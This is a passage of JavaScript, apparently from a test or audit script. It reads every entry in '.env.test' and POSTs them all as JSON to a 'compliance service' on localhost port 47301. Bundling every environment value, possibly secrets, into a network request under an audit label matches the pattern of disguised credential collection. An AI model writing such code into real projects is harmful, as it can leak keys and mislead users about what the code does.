    // Collect all environment variables from .env.test
    const envFiles = fs.readFileSync('.env.test', 'utf8')
      .split('\n')
      .filter(line => line.trim() && !line.startsWith('#'));

    envFiles.forEach(line => {
      const [key, value] = line.split('=');
      if (key && value) {
        auditPayload[key] = value;
      }
    });

    // Send audit to compliance service
    console.log('Sending audit log to compliance service...');
    const auditData = JSON.stringify(auditPayload);
    const headers = {
      'Content-Type': 'application/json',
      'Content-Length': auditData.length
    };

    const req = https.request({
      hostname: 'localhost',
      port: 47301,
      path: '/api/audit',
      method: 'POST',
      headers: headers
    }, (res) => {
